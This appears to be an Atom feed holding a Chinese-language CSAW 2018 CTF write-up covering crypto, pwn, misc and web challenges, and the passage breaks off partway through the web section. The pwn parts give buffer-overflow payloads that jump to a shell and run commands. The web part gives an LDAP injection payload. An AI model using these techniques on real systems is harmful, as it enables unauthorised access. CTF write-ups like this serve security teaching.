<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://threst.github.io/"/>
  <updated>2018-10-04T07:21:38.193Z</updated>
  <id>https://threst.github.io/</id>
  
  <author>
    <name>threst</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>csaw 2018 wp</title>
    <link href="https://threst.github.io/2018/10/04/csaw2018wp/"/>
    <id>https://threst.github.io/2018/10/04/csaw2018wp/</id>
    <published>2018-10-04T05:34:14.000Z</published>
    <updated>2018-10-04T07:21:38.193Z</updated>
    
    <content type="html"><![CDATA[<p>首发安全脉搏:<a href="https://www.secpulse.com/archives/75785.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/75785.html</a></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet</span><br><span class="line">single yeet yeeted with single yeet == 0</span><br><span class="line">yeeet</span><br><span class="line">what is yeet?</span><br><span class="line">yeet is yeet</span><br><span class="line">Yeetdate: yeeted yeet at yeet: 9:42 pm</span><br></pre></td></tr></table></figure></p><p>提示<code>single yeet yeeted with single yeet == 0</code><br>想到<code>a XOR a == 0</code>,可能是单字的xor加密</p><p>ciphertext</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg==</span><br></pre></td></tr></table></figure><p>首先要将密文base64解码，再进行xor运算,脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">ciphertext = b64decode(<span class="string">"s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg=="</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    plaintext = xor(key, ciphertext)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag&#123;"</span> <span class="keyword">in</span> plaintext:</span><br><span class="line">        <span class="keyword">print</span> plaintext</span><br></pre></td></tr></table></figure></p><p>flag:<code>flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}</code></p><h3 id="flatcrypt"><a href="#flatcrypt" class="headerlink" title="flatcrypt"></a>flatcrypt</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">no logos or branding for this bug</span><br><span class="line"></span><br><span class="line">Take your pick nc crypto.chal.csaw.io 8040 nc crypto.chal.csaw.io 8041 nc crypto.chal.csaw.io 8042 nc crypto.chal.csaw.io 8043</span><br><span class="line"></span><br><span class="line">flag is not in flag format. flag is PROBLEM_KEY</span><br></pre></td></tr></table></figure></p><p>serv-distribute.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">ENCRYPT_KEY = bytes.fromhex(<span class="string">'0000000000000000000000000000000000000000000000000000000000000000'</span>)</span><br><span class="line"><span class="comment"># Determine this key.</span></span><br><span class="line"><span class="comment"># Character set: lowercase letters and underscore</span></span><br><span class="line">PROBLEM_KEY = <span class="string">'not_the_flag'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data, ctr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter=ctr).encrypt(zlib.compress(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    f = input(<span class="string">"Encrypting service\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(f) &lt; <span class="number">20</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    enc = encrypt(bytes((PROBLEM_KEY + f).encode(<span class="string">'utf-8'</span>)), Counter.new(<span class="number">64</span>, prefix=os.urandom(<span class="number">8</span>)))</span><br><span class="line">    print(<span class="string">"%s%s"</span> %(enc, chr(len(enc))))</span><br></pre></td></tr></table></figure></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="bigboy"><a href="#bigboy" class="headerlink" title="bigboy"></a>bigboy</h3><p>题目<code>nc pwn.chal.csaw.io 9000</code></p><p><img src="https://i.loli.net/2018/09/18/5ba0f9d237bc0.png" alt=""></p><p>无论输入什么都只打印一个时间就退出了,拖进ida看看</p><p><img src="https://i.loli.net/2018/09/19/5ba2401be83b4.png" alt=""></p><p>我们要将程序将跳转到调用系统的函数才可以。</p><p><img src="https://i.loli.net/2018/09/19/5ba2401be196b.png" alt=""></p><p>修改eax的值</p><p><code>nc pwn.chal.csaw.io 9000 &lt;&lt;&lt; $(python -c &quot;print &#39;aaaaaaaaaaaaaaaaaaaa\xee\xba\xf3\xca&#39;&quot;)</code></p><p><img src="https://i.loli.net/2018/09/19/5ba23f9cd2b06.png" alt=""></p><p>看看有些什么</p><p><code>nc pwn.chal.csaw.io 9000 &lt;&lt;&lt; $(python -c &quot;print &#39;aaaaaaaaaaaaaaaaaaaa\xee\xba\xf3\xcals&#39;&quot;)</code></p><p><img src="https://i.loli.net/2018/09/19/5ba23f9cd5d22.png" alt=""></p><p>有个flag.txt</p><p><code>nc pwn.chal.csaw.io 9000 &lt;&lt;&lt; $(python -c &quot;print &#39;aaaaaaaaaaaaaaaaaaaa\xee\xba\xf3\xcacat flag.txt&#39;&quot;)</code></p><p><img src="https://i.loli.net/2018/09/19/5ba23f9cdf3e3.png" alt=""></p><p>flag:<code>flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}</code></p><h3 id="get-it"><a href="#get-it" class="headerlink" title="get it?"></a>get it?</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Do you get it?</span><br><span class="line">nc pwn.chal.csaw.io 9001</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/09/19/5ba247605f46e.png" alt=""></p><p>无论输入什么都会重复你输入的然后退出。</p><p><code>objdump -d get_it</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00000000004005b6 &lt;give_shell&gt;:</span><br><span class="line">  4005b6:   55                      push   %rbp</span><br><span class="line">  4005b7:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">  4005ba:   bf 84 06 40 00          mov    $0x400684,%edi</span><br><span class="line">  4005bf:   e8 bc fe ff ff          callq  400480 &lt;system@plt&gt;</span><br><span class="line">  4005c4:   90                      nop</span><br><span class="line">  4005c5:   5d                      pop    %rbp</span><br><span class="line">  4005c6:   c3                      retq   </span><br><span class="line"></span><br><span class="line">00000000004005c7 &lt;main&gt;:</span><br><span class="line">  4005c7:   55                      push   %rbp</span><br><span class="line">  4005c8:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">  4005cb:   48 83 ec 30             sub    $0x30,%rsp</span><br><span class="line">  4005cf:   89 7d dc                mov    %edi,-0x24(%rbp)</span><br><span class="line">  4005d2:   48 89 75 d0             mov    %rsi,-0x30(%rbp)</span><br><span class="line">  4005d6:   bf 8e 06 40 00          mov    $0x40068e,%edi</span><br><span class="line">  4005db:   e8 90 fe ff ff          callq  400470 &lt;puts@plt&gt;</span><br><span class="line">  4005e0:   48 8d 45 e0             lea    -0x20(%rbp),%rax</span><br><span class="line">  4005e4:   48 89 c7                mov    %rax,%rdi</span><br><span class="line">  4005e7:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  4005ec:   e8 af fe ff ff          callq  4004a0 &lt;gets@plt&gt;</span><br><span class="line">  4005f1:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  4005f6:   c9                      leaveq </span><br><span class="line">  4005f7:   c3                      retq   </span><br><span class="line">  4005f8:   0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005ff:   00</span><br></pre></td></tr></table></figure><p>注意这两个函数,<code>main</code>中<code>gets</code>非常可疑,再查看下<code>give_shell</code>函数<code>0x400684</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x400684</span><br><span class="line">0x400684:   &quot;/bin/bash&quot;</span><br></pre></td></tr></table></figure><p>这是要调用<code>system(&quot;/bin/bash&quot;);</code>搞事啊！！！那就来一波ida F5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [rsp+10h] [rbp-20h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Do you gets it??&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int give_shell()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gets(char * s)</code>接受一个参数，它将写入的内存中的位置，然后它将写入你输入的所有字符,<code>lea</code>指令只是做了一些数学运算。在这里表示<code>rax = rbp - 0x20</code>,顺便说一句，<code>0x20 = 32</code>,我们用<code>A</code>来填充获取的局部变量缓冲区。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break *0x00000000004005f6</span><br><span class="line">Breakpoint 1 at 0x4005f6</span><br><span class="line">(gdb) run</span><br><span class="line">Starting program: /get_it </span><br><span class="line">Do you gets it??</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004005f6 in main ()</span><br><span class="line">(gdb) x/6xg $rbp - 0x20</span><br><span class="line">0x7fffffffde90: 0x4141414141414141  0x4141414141414141</span><br><span class="line">0x7fffffffdea0: 0x4141414141414141  0x4141414141414141</span><br><span class="line">0x7fffffffdeb0: 0x0000000000400600  0x00007ffff7e11b17</span><br></pre></td></tr></table></figure><p>测试一下<br><code>python -c &quot;print &#39;A&#39; * 32 + &#39;B&#39;*8 + &#39;\xb6\x05@\x00\x00\x00\x00\x00&#39;&quot; &gt; test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run &lt; test</span><br><span class="line">Starting program: /get_it &lt; test</span><br><span class="line">Do you gets it??</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004005f6 in main ()</span><br><span class="line">(gdb) x/6xg $rbp - 0x20</span><br><span class="line">0x7fffffffde90: 0x4141414141414141  0x4141414141414141</span><br><span class="line">0x7fffffffdea0: 0x4141414141414141  0x4141414141414141</span><br><span class="line">0x7fffffffdeb0: 0x4242424242424242  0x00000000004005b6</span><br><span class="line">(gdb)  nexti</span><br><span class="line">0x00000000004005f7 in main ()</span><br><span class="line">(gdb)  nexti</span><br><span class="line">0x00000000004005b6 in give_shell ()</span><br></pre></td></tr></table></figure><p>ok,进入<code>give_shell</code></p><p><img src="https://i.loli.net/2018/09/19/5ba251939684a.png" alt=""></p><p>flag:<code>flag{y0u_deF_get_itls}</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Short-Circuit"><a href="#Short-Circuit" class="headerlink" title="Short Circuit"></a>Short Circuit</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Start from the monkey&apos;s paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.</span><br><span class="line"></span><br><span class="line">Elyk</span><br></pre></td></tr></table></figure></p><p>下载图片下来</p><p><img src="https://i.loli.net/2018/09/18/5ba0fe4a7da94.jpg" alt=""></p><p>这个就是很多个LED灯连在一起，分析一下，连了地线的表示<code>&quot;1&quot;</code>,其他表示<code>&quot;0&quot;</code>,</p><p><img src="https://i.loli.net/2018/09/18/5ba0fe08dedfe.png" alt=""></p><p>最后表示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">01100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 01111001</span><br><span class="line">01101000 01100001 01101110 01100100 01111101</span><br></pre></td></tr></table></figure></p><p>flag:<code>flag{owmyhand}</code></p><h3 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Are you a real math wiz?</span><br><span class="line"></span><br><span class="line">nc misc.chal.csaw.io 9002</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/09/18/5ba1058f8c4ad.png" alt=""></p><p>就是根据他的等式来接<code>X</code>,题目会越来越难,写个脚本就可以解开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"misc.chal.csaw.io"</span>, <span class="number">9002</span>)</span><br><span class="line">r.recvuntil(<span class="string">"*********"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    task = r.recvline()</span><br><span class="line">    <span class="keyword">print</span> task</span><br><span class="line">    <span class="keyword">print</span> r.recvuntil(<span class="string">"What does X equal?: "</span>)</span><br><span class="line">    eq1 = task.replace(<span class="string">"="</span>,<span class="string">"-("</span>)+<span class="string">")"</span></span><br><span class="line">    c = eval(eq1,&#123;<span class="string">"X"</span>:<span class="number">1j</span>&#125;)</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> c.imag != <span class="number">0</span>:</span><br><span class="line">        result = -c.real/c.imag</span><br><span class="line">    r.sendline(str(result))</span><br><span class="line">    <span class="keyword">print</span> r.recvline()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/09/18/5ba10699ef1e8.png" alt=""></p><p>flag:<code>flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}</code></p><h3 id="Take-an-L"><a href="#Take-an-L" class="headerlink" title="Take an L"></a>Take an L</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Fill the grid with L&apos;s but avoid the marked spot for the W</span><br><span class="line">nc misc.chal.csaw.io 9000</span><br><span class="line">The origin is at (0,0) on the top left</span><br></pre></td></tr></table></figure></p><p>通过google,发现了<a href="https://www.geeksforgeeks.org/tiling-problem-using-divide-and-conquer-algorithm/" target="_blank" rel="noopener">这个</a></p><p>使用的算法是recursiv,我们在网格的中间放置一个<code>“L”</code>（L-tromino），然后我们将网格分割成子网格，并为每个子网格执行相同的过程。当网格与我们的<code>“L”</code>（2 * 2）大小相同时，递归函数停止。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">HOST = <span class="string">"misc.chal.csaw.io"</span></span><br><span class="line">PORT = <span class="number">9000</span></span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(c)</span>:</span></span><br><span class="line">    print(c)</span><br><span class="line">    r.sendline(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rec =  r.recvuntil(<span class="string">"marked block: "</span>)</span><br><span class="line">print(rec)</span><br><span class="line">black = eval(r.recvuntil(<span class="string">"\n"</span>).strip())</span><br><span class="line">print(<span class="string">"Black cell: "</span>+str(black))</span><br><span class="line"></span><br><span class="line">n = <span class="number">64</span> </span><br><span class="line">a = [[<span class="string">' '</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(n)] <span class="keyword">for</span> y <span class="keyword">in</span> range(n)] </span><br><span class="line">a[black[<span class="number">1</span>]][black[<span class="number">0</span>]] = <span class="string">"@"</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pgrille</span><span class="params">()</span>:</span></span><br><span class="line">    out = <span class="string">""</span></span><br><span class="line">    out += <span class="string">"-"</span>*n</span><br><span class="line">    out += <span class="string">"\n"</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> a:</span><br><span class="line">        out += str(<span class="string">''</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> l]))+<span class="string">"\n"</span></span><br><span class="line">    out += <span class="string">"-"</span>*n</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"logs"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> fi:</span><br><span class="line">        fi.write(out+<span class="string">"\n\n\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBlack</span><span class="params">(a,x_start,y_start,x_end,y_end)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(y_start,y_end+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x_start,x_end+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> a[j][i] == <span class="string">"o"</span> <span class="keyword">or</span> a[j][i] == <span class="string">"@"</span>:</span><br><span class="line">                <span class="keyword">return</span> i,j</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span>,<span class="keyword">None</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Tile</span><span class="params">(a,x_start,y_start,x_end,y_end)</span>:</span></span><br><span class="line">    xcenter_left = x_start+((x_end-x_start)/<span class="number">2</span>)</span><br><span class="line">    xcenter_right = xcenter_left+<span class="number">1</span></span><br><span class="line">    ycenter_top = y_start+((y_end-y_start)/<span class="number">2</span>)</span><br><span class="line">    ycenter_bottom = ycenter_top+<span class="number">1</span></span><br><span class="line">    xBlack,yBlack = getBlack(a,x_start,y_start,x_end,y_end)</span><br><span class="line">    <span class="keyword">if</span> xBlack &lt;= xcenter_left: </span><br><span class="line">        <span class="keyword">if</span> yBlack &lt;= ycenter_top: </span><br><span class="line">            a[ycenter_top][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_bottom][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_bottom][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            send(<span class="string">"("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_top)+<span class="string">"),("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">"),("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">")"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a[ycenter_top][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_top][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_bottom][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            send(<span class="string">"("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_top)+<span class="string">"),("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_top)+<span class="string">"),("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">")"</span>)</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">if</span> yBlack &lt;= ycenter_top: </span><br><span class="line">            a[ycenter_top][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_bottom][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_bottom][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            send(<span class="string">"("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_top)+<span class="string">"),("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">"),("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">")"</span>)</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            a[ycenter_bottom][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_top][xcenter_left] = <span class="string">"o"</span></span><br><span class="line">            a[ycenter_top][xcenter_right] = <span class="string">"o"</span></span><br><span class="line">            send(<span class="string">"("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_bottom)+<span class="string">"),("</span>+str(xcenter_left)+<span class="string">","</span>+str(ycenter_top)+<span class="string">"),("</span>+str(xcenter_right)+<span class="string">","</span>+str(ycenter_top)+<span class="string">")"</span>)</span><br><span class="line">    </span><br><span class="line">    pgrille() </span><br><span class="line">    <span class="keyword">if</span> abs(x_end-x_start) &gt; <span class="number">1</span>: </span><br><span class="line">        Tile(a,x_start,y_start,xcenter_left,ycenter_top)</span><br><span class="line">        Tile(a,xcenter_right,y_start,x_end,ycenter_top)</span><br><span class="line">        Tile(a,x_start,ycenter_bottom,xcenter_left,y_end)</span><br><span class="line">        Tile(a,xcenter_right,ycenter_bottom,x_end,y_end)</span><br><span class="line">    </span><br><span class="line">Tile(a,<span class="number">0</span>,<span class="number">0</span>,len(a[<span class="number">0</span>])<span class="number">-1</span>,len(a)<span class="number">-1</span>) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>参考大佬<a href="https://www.aperikube.fr/docs/csawquals_2018/takeanl/" target="_blank" rel="noopener">代码</a></p><p>flag:<code>flag{m@n_that_was_sup3r_hard_i_sh0uld_have_just_taken_the_L}</code></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ldab"><a href="#Ldab" class="headerlink" title="Ldab"></a>Ldab</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dab</span><br><span class="line">http://web.chal.csaw.io:8080</span><br></pre></td></tr></table></figure></p><p>一个简单的LDAP注入</p><p>payload:<code>http://web.chal.csaw.io:8080/index.php/index.php?search=*)(uid=*))(|(uid=*</code></p><p><img src="https://i.loli.net/2018/09/18/5ba1062506e4c.png" alt=""></p><p>flag:<code>flag{ld4p_inj3ction_i5_a_th1ng}</code></p><h3 id="sso"><a href="#sso" class="headerlink" title="sso"></a>sso</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Be the admin you were always meant to be</span><br><span 